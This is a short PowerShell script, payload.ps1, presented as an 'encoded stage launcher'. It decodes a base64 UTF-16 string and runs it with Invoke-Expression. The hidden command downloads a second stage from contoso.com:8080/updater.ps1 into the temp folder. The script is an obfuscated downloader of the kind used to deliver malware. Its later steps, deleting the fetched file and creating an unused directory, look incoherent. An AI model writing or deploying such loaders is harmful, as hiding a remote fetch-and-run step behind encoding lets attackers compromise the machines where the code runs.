
<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\payload.ps1
#>
$EncodedStage = (
    "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AYwBvAG4AdABvAHMAbwAu" +
    'AGMAbwBtADoAOAAwADgAMAAvAHUAcABkAGEAdABlAHIALgBwAHMAMQAiADsAIABJAG4AdgBvAGsA' +
    'ZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABTAHQAYQBnAGUAMgBVAHIAbAAg' +
    "AC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAMgAuAGIA" +
    "aQBuACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAA=="
)
$PayloadText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedStage))
try {
    Write-Verbose ("Decoded stage length: " + $PayloadText.Length)
    if ([string]::IsNullOrWhiteSpace($PayloadText)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $PayloadText
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ProgressPreference = "SilentlyContinue"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
